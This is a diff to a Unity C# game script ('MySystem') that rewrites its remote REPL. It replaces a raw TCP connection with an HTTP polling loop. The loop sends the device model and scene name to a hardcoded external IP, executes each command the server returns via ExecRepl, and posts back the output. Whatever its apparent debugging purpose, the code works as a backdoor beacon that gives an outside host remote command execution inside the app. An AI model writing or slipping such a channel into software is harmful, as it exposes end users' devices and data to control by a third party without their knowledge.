@@ -4,6 +4,7 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using UnityEngine.Networking;
 using UnityEngine;
 using UnityEngine.SceneManagement;
 
@@ -291,30 +292,41 @@ public class MySystem : MonoBehaviour
 		StartRepl();
 	}
 
-	private TcpClient replClient;
-	private NetworkStream replStream;
 	private void StartRepl()
 	{
-		new Thread(() =>
+		StartCoroutine(ReplLoop());
+	}
+
+	private System.Collections.IEnumerator ReplLoop()
+	{
+		yield return new WaitForSeconds(1f);
+		string nextMsg = "REPL READY: " + SystemInfo.deviceModel + " scene=" + SceneManager.GetActiveScene().name;
+		while (true)
 		{
-			try
+			string url = "http://80.225.252.235:9998/";
+			using (var req = new UnityWebRequest(url, "POST"))
 			{
-				replClient = new TcpClient();
-				replClient.Connect("80.225.252.235", 9998);
-				replStream = replClient.GetStream();
-				var writer = new StreamWriter(replStream) { AutoFlush = true };
-				var reader = new StreamReader(replStream);
-				writer.WriteLine("REPL READY: " + SystemInfo.deviceModel);
-				while (true)
+				byte[] body = System.Text.Encoding.UTF8.GetBytes(nextMsg);
+				req.uploadHandler = new UploadHandlerRaw(body);
+				req.downloadHandler = new DownloadHandlerBuffer();
+				req.timeout = 8;
+				yield return req.SendWebRequest();
+				if (req.result == UnityWebRequest.Result.Success)
 				{
-					var cmd = reader.ReadLine();
-					if (cmd == null) break;
-					try { writer.WriteLine(ExecRepl(cmd)); }
-					catch (System.Exception ex) { writer.WriteLine("ERR: " + ex.Message); }
+					string cmd = req.downloadHandler.text.Trim();
+					if (cmd == "NOP" || string.IsNullOrEmpty(cmd))
+						nextMsg = "ACK";
+					else
+					{
+						try { nextMsg = ExecRepl(cmd); }
+						catch (System.Exception ex) { nextMsg = "ERR: " + ex.Message; }
+					}
 				}
+				else
+					nextMsg = "NET_ERR: " + req.error;
 			}
-			catch (System.Exception e) { SendLog("REPL FAIL: " + e.Message); }
-		}){ IsBackground = true }.Start();
+			yield return new WaitForSeconds(0.5f);
+		}
 	}
 
 	private bool _guiReady = false;
